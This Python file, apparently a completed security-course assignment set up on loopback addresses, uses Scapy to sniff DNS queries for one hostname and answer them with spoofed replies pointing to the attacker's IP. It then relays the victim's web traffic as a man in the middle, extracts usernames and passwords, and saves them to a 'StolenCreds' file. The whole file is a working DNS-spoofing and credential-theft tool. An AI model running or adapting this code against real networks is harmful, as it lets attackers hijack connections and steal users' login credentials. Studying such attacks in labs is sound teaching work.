import os
import argparse
import socket
from scapy.all import *

conf.L3socket = L3RawSocket
# Check if running macOS
if 'Darwin' == os.uname().sysname:
    conf.use_pcap = True
    INTERFACE = "lo0"
else:
    INTERFACE = "lo"
WEB_PORT = 8000
HOSTNAME = "gurgurtelem.com"


def resolve_hostname(hostname):
    # IP address of HOSTNAME. Used to forward tcp connection.
    # Normally obtained via DNS lookup.
    return "127.0.0.1"


def log_credentials(username, password):
    # Write stolen credentials out to file.
    # Do not change this.
    with open("lib/StolenCreds.txt", "wb") as fd:
        fd.write(b"Stolen credentials: username=" +
                 username + b" password=" + password)


def check_credentials(client_data):
    # Take a block of client data and search for username/password credentials.
    # If found, log the credentials to the system by calling log_credentials().
    if b'username' in client_data and b'password' in client_data:
        print(f'Found credentials in request: {client_data}')
        log_credentials(client_data.split(b"username=\'")[1].split(b"'")[0],
                        client_data.split(b"password='")[1].split(b"'")[0])


def handle_tcp_forwarding(evil_sock, client_ip, hostname):
    # Continuously intercept new connections from the client
    # and initiate a connection with the host in order to forward data
    newline = '\n'
    while True:

        # Accept a new connection from the client on client_socket and
        # create a new socket to connect to the actual host associated with hostname.
        # wait for connection for timeout seconds.
        client_conn, (addr, port) = evil_sock.accept()
        print(
            f'Connection from {addr}:{port} established. Sniffing for credentials...')
        real_server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        real_server_sock.connect((resolve_hostname(hostname), WEB_PORT))

        # Read data from client socket, check for credentials, and forward along to host socket.
        # Check for POST to '/post_logout' and exit after that request has completed.
        data = client_conn.recv(4096)
        print(f'Received data from client: {data.decode().split(newline)[0]}')
        check_credentials(data)
        real_server_sock.send(data)
        should_exit = b'POST /post_logout' in data

        data = real_server_sock.recv(4096)
        print(f'Received data from host: {data.decode().split(newline)[0]}')
        client_conn.send(data)
        real_server_sock.close()
        client_conn.close()
        if should_exit:
            print(f'Client {addr} has logged out')
            break


def dns_callback(packet, *extra_args):
    global last_source_port
    # Callback function for handling DNS packets.
    # Sends a spoofed DNS response for a query to HOSTNAME and calls handle_tcp_forwarding() after successful spoof.
    attacker_ip = extra_args[0]
    evil_sock = extra_args[1]
    print(
        f'DNS packet received from {packet[IP].src}:{packet[UDP].sport} to DNS server {packet[IP].dst}:53. Spoofing response attacker ip {attacker_ip}...')
    payload = IP(src=packet[IP].dst, dst=packet[IP].src) / \
        UDP(sport=53, dport=packet[UDP].sport) / \
        DNS(id=packet[DNS].id, qr=1, aa=1, qd=packet[DNS].qd,
            an=DNSRR(rrname=HOSTNAME, rdata=attacker_ip))
    send(payload, 
    # iface=INTERFACE
    )
    handle_tcp_forwarding(evil_sock, attacker_ip, HOSTNAME)


def sniff_and_spoof(attacker_ip):
    # Open a socket and bind it to the attacker's IP and WEB_PORT.
    # This socket will be used to accept connections from victimized clients.
    evil_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    evil_sock.bind((attacker_ip, WEB_PORT))
    evil_sock.listen(5)

    # Sniff for DNS packets on the network. Make sure to pass attacker_ip
    # and the socket you created as extra callback arguments.
    sniff(filter=f"udp port 53", prn=lambda p: dns_callback(p, attacker_ip, evil_sock), store=0,
          lfilter=lambda p: p.haslayer(
              DNSQR) and HOSTNAME in p[DNSQR].qname.decode() and p[DNS].qr == 0,
          count=0,
        #   iface=INTERFACE
          )


def main():
    parser = argparse.ArgumentParser(
        description='Attacker who spoofs dns packet and hijacks connection')
    parser.add_argument('--source_ip', nargs='?', const=1,
                        default="127.0.0.3", help='ip of the attacker')
    args = parser.parse_args()

    sniff_and_spoof(args.source_ip)


if __name__ == "__main__":
    # Change working directory to script's dir.
    # Do not change this.
    abspath = os.path.abspath(__file__)
    dirname = os.path.dirname(abspath)
    os.chdir(dirname)
    main()
